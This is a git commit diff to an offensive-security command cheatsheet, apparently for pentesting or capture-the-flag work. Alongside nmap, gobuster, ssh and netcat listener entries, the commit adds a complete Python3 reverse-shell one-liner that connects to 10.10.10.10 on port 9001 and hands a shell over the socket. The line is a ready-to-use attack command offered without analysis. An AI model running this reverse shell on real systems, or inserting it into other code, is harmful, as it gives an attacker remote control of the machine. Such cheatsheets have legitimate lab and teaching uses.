b79e9b19034be73786db86437b9baf7515ebc97b
NextGenSec <142174128+NextGenSec-Github@users.noreply.github.com>
2024-04-07 00:40:06 +0500

    Update random.sh

--- Command Cheatsheets/random.sh
+++ Command Cheatsheets/random.sh
@@ -7,7 +7,6 @@ nmap <server-ip>
 # SSH to server
 ssh username@server
 
-
 # gobuster for directory enum
 gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>
 
@@ -19,3 +18,6 @@ nc -lvnp 9999
 
 # Find the ip address of your main nic
 ip addr show eth0
+
+# Reverse Shell with Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
